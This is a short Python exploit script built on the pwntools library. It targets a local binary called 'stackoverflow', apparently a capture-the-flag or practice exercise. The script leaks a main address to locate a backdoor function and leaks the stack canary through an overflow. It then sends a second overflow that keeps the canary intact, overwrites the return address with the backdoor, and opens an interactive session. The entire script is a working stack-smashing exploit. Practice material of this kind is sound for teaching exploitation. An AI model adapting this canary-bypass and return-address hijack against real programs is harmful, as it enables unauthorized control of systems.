#!/usr/bin/env python3
from pwn import *

p = process('./stackoverflow')
# p = remote('localhost', 5566)

raw_input('>')

p.recvuntil(b'main: ')
backdoor = int(p.recvuntil(b'\n', drop=True), 16) - 0x124c + 0x1238

payload = b'a' * 11
p.sendafter(b'?', payload)

p.recvuntil(b'a' * 11)
canary = p.recv(7)

rbp = 0
payload  = b'a' * 10 
payload += b'\0' + canary
payload += p64(rbp)
payload += p64(backdoor)
p.sendafter(b'YOU?', payload)

p.interactive()

